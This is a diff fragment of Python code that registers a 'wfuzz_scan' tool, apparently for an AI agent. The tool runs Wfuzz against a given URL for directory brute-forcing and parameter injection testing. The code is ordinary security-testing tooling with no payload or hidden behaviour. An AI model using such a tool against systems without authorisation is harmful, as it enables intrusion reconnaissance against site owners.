+    wordlist = (args.get("wordlist") or "/usr/share/wordlists/dirb/common.txt").strip()
+    filter_code = (args.get("filter_code") or "").strip()
+    extra = (args.get("additional_args") or "").strip()
+    project_id = args.get("project_id")
+    timeout_s = int(args.get("timeout", 120))
+
+    if not url:
+        return "Error: url is required. Use FUZZ as placeholder (e.g. http://target/FUZZ or ?param=FUZZ)."
+    if not shutil.which("wfuzz"):
+        return "Error: wfuzz not found in PATH. Install: pip install wfuzz"
+
+    cmd = ["wfuzz", "-w", wordlist]
+    if filter_code:
+        cmd += ["--hc", filter_code]
+    if extra:
+        cmd += extra.split()
+    cmd.append(url)
+
+    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
+    await _persist(project_id, "wfuzz_scan", args, stdout, stderr, exit_code)
+    if exit_code == -1:
+        return stderr
+    return stdout or stderr or "Wfuzz scan completed with no results."
+
+
+register(
+    Tool(
+        name="wfuzz_scan",
+        description="Web application fuzzing with Wfuzz. Use FUZZ placeholder in URL for directory/file brute-forcing, or in parameters for injection testing. Supports custom wordlists and response filtering.",
+        inputSchema={
+            "type": "object",
+            "required": ["url"],
+            "properties": {
+                "url": {"type": "string", "description": "URL with FUZZ placeholder (e.g. http://target/FUZZ or http://target/?id=FUZZ)"},
+                "wordlist": {"type": "string", "description": "Wordlist path (default: /usr/share/wordlists/dirb/common.txt)"},
+                "filter_code": {"type": "string", "description": "Hide responses with these HTTP codes (e.g. '404,403')"},
+                "additional_args": {"type": "string", "description": "Extra wfuzz flags (e.g. '-H Cookie:...')"},
+                "timeout": {"type": "integer", "description": "Timeout in seconds (default: 120)"},
+                "project_id": {"type": "integer"},
+            },
+        },
+    ),
+    _wfuzz_scan,
 )
